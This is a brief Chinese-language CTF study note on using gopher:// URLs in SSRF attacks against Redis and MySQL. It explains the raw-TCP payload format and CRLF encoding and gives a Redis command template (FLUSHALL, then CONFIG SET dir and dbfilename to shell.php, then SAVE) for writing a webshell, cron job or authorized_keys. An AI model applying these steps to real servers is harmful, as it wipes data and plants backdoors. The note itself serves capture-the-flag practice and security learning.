# gopher + Redis/MySQL 利用（进阶）

## 为什么 gopher 关键
`gopher://` 可以让你构造原始 TCP 数据包，从“请求网页”升级为“和任意 TCP 服务说话”。

## 基本格式
`gopher://host:port/_<urlencoded_payload>`

注意：
- `_` 后面是原始数据。
- 需要 URL 编码，`
` 编码为 `%0d%0a`。

## Redis 场景（CTF 常见）
目标：写 webshell / 写计划任务 / 写 authorized_keys（视题目环境）。

步骤模板：
1. `FLUSHALL`
2. `SET key value`
3. `CONFIG SET dir /var/www/html`
4. `CONFIG SET dbfilename shell.php`
5. `SAVE`

以上命令拼接成 RESP 协议，再 URL 编码放入 gopher。

## MySQL 场景
- 直接利用难度通常高于 Redis。
- CTF 常简化为已知认证或可触发 SSRF 打内网管理面板。

## 常见坑
- 后端禁用 gopher。
- URL 编码不完整导致 payload 损坏。
- 目标服务并非你猜测的版本或权限受限。

## 实操建议
- 先用最短 payload 验证“目标端口可交互”。
- 再上复杂 payload，分步骤观察变化。
- 模板见 [[payloads/gopher模板]]。
